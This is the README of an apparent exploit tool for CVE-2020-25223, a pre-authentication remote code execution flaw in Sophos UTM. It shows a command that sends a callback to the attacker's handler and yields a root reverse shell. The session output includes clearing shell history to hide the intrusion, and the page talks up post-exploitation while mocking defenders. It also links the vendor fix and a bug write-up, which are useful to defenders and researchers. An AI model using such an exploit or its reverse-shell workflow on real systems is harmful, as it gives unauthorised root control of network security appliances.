# sophucked
CVE-2020-25223 RCE PoC, gets reverse shell. Pre-auth. Implemented this quickly as it was needed to unify some threat magnets. 


## Example Use:
```
# python sophucked.py https://x.x.x.x:4443 x.x.x.x 80
(+) starting handler on port 80
(+) Sending callback to x.x.x.x:80
(+) connection from x.x.x.x
(+) pop thy shell!
bash: no job control in this shell
utm:/var/confd # unset HISTFILE
unset HISTFILE
utm:/var/confd # id
id
uid=0(root) gid=0(root) groups=0(root)
utm:/var/confd # exit
exit
exit
*** Connection closed by remote host ***
# 
```

## Scanning/Detection
Not implemented in this, just use the [nuclei template](https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2020/CVE-2020-25223.yaml).

## Post-exploitation notes
These have a python interpreter, and actually a very fully featured Linux environment available. Amazing potential for post-exploitation. 

## Blue team notes
I'm sure someone who cares can fill this in. Bitter (a subset of "blue team twitter") will probably do so shortly. I mean, it can't be that hard to detect an unencrypted reverse shell beaconing out from your Unified Threat Manager box right?

## Fixing the bug  
Someone (presumably from Sophos) sent this over, its the official fix link. Go update your UTM. https://www.sophos.com/en-us/security-advisories/sophos-sa-20200918-sg-webadmin-rce

## References, etc.

Third party reference (bug details): https://www.atredis.com/blog/2021/8/18/sophos-utm-cve-2020-25223

Direct complaints to Sophos, who somehow thought passing user input to `open()` in Perl was a good idea in the 21st century. 
